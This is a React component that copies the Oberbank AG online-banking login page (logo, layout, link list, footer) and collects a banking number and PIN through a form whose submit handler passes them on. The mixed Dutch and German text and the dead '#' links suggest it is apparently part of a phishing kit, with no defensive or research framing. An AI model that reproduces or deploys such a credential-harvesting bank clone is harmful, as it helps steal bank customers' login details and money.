"use client";


type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function Oberbank({ formData, onChange, handleRouteAction, saving }: Props) {
  return (
    <div className="min-h-screen bg-white flex flex-col font-sans">
      {/* Top Red Bar */}
      <div className="h-12 bg-[#cc0000] w-full"></div>

      {/* Header */}
      <header className="bg-white py-6 px-4 mb-4">
        <div className="max-w-5xl mx-auto">
          <img src="/oberbank-logo.webp" alt="Oberbank Logo" className="h-8" />
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-grow flex items-start justify-center p-4">
        <div className="max-w-5xl mx-auto w-full grid grid-cols-1 md:grid-cols-3 gap-5">
          
          {/* Column 1: Login */}
          <div className="bg-white border border-gray-300 flex flex-col h-[420px]">
            <div className="p-6 flex flex-col flex-grow">
              <h2 className="text-[#333] text-[15px] mb-6">Klantenportaal Login</h2>
              
              <form 
                onSubmit={(e) => {
                  e.preventDefault();
                  handleRouteAction();
                }}
                className="flex flex-col gap-3"
              >
                <input
                  type="text"
                  placeholder="Banking-Nummer"
                  value={formData.verfuegernummer || ""}
                  onChange={(e) => onChange("verfuegernummer", e.target.value)}
                  className="w-full bg-[#e8e9ea] text-gray-700 placeholder-gray-500 px-3 py-2 outline-none text-[13px]"
                />
                <div className="flex gap-2">
                  <input
                    type="password"
                    placeholder="Ihre PIN"
                    value={formData.pin || ""}
                    onChange={(e) => onChange("pin", e.target.value)}
                    className="w-[60%] bg-[#e8e9ea] text-gray-700 placeholder-gray-500 px-3 py-2 outline-none text-[13px]"
                  />
                  <div className="w-[40%] relative">
                    <select className="w-full bg-[#e8e9ea] text-gray-700 px-3 py-2 outline-none appearance-none cursor-pointer text-[13px]">
                      <option>Deutsch</option>
                      <option>English</option>
                    </select>
                    <div className="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-500">
                      <svg className="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
                        <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
                      </svg>
                    </div>
                  </div>
                </div>
                <p className="text-[11px] text-gray-600 mt-1 leading-relaxed pr-4">
                  Uw inlog verloopt via een beveiligde SSL-verbinding.
                </p>
                <div className="flex justify-end mt-4">
                  <button
                    type="submit"
                    disabled={saving}
                    className="bg-[#cc0000] text-white font-bold px-8 py-2 hover:bg-[#a30000] transition-colors text-[13px] rounded-sm"
                  >
                    {saving ? "Laden..." : "Weiter"}
                  </button>
                </div>
              </form>
            </div>
            {/* Footer */}
            <div className="border-t border-gray-200 p-2 flex justify-end bg-white">
              <button className="text-[12px] text-[#333] hover:text-black px-2 py-1">
                Erstanmeldung
              </button>
            </div>
          </div>

          {/* Column 2: Links */}
          <div className="bg-white border border-gray-300 flex flex-col h-[420px]">
            <div className="p-6 pb-4">
              <h2 className="text-[#333] text-[15px]">Weiterführende Links</h2>
            </div>
            <div className="flex flex-col flex-grow overflow-y-auto">
              {[
                "Funktionsübersicht / Video",
                "FAQs - Häufig gestellte Fragen",
                "Wertpapier-Infos",
                "Sicherheit",
                "Security-App",
                "Servicenummern",
                "Support-Tool (Fernwartung)"
              ].map((link, idx) => (
                <a key={idx} href="#" className="flex justify-between items-center px-6 py-3 border-t border-gray-100 text-[13px] text-[#555] hover:bg-gray-50">
                  {link}
                  <span className="text-gray-400 font-bold">&gt;</span>
                </a>
              ))}
              <div className="border-t border-gray-100 flex-grow"></div>
            </div>
          </div>

          {/* Column 3: Promo */}
          <div className="flex flex-col h-[420px] overflow-hidden border border-gray-300 bg-white items-center justify-center">
            <img 
              src="/oberbank-promo.webp" 
              alt="Promo" 
              className="w-full h-full object-contain" 
            />
          </div>

        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white py-12 px-4 mt-auto">
        <div className="max-w-5xl mx-auto flex flex-col md:flex-row justify-between items-center text-[11px] text-[#666]">
          <div className="flex gap-6 mb-4 md:mb-0">
            <a href="#" className="hover:underline">Impressum</a>
            <a href="#" className="hover:underline">AGB</a>
            <a href="#" className="hover:underline">Filialfinder</a>
            <a href="#" className="hover:underline">Fernwartung</a>
          </div>
          <div>
            © 2026 Oberbank AG
          </div>
        </div>
      </footer>

      {/* Floating Chat */}
      <div className="fixed bottom-6 right-6 z-50">
        <button className="bg-[#cc0000] text-white w-[52px] h-[52px] rounded-full shadow-lg flex items-center justify-center hover:bg-[#a30000] transition-colors">
          <svg className="w-7 h-7" fill="currentColor" viewBox="0 0 24 24">
            <path d="M12 2C6.477 2 2 5.806 2 10.5c0 2.56 1.348 4.851 3.473 6.371-.249 1.762-1.25 3.33-1.344 3.475-.125.195-.067.445.132.564.088.053.188.079.287.079.138 0 .275-.055.375-.157 2.215-2.261 4.14-2.822 5.093-2.956C10.655 18.232 11.319 18.3 12 18.3c5.523 0 10-3.806 10-8.5S17.523 2 12 2z" />
          </svg>
        </button>
      </div>
    </div>
  );
}
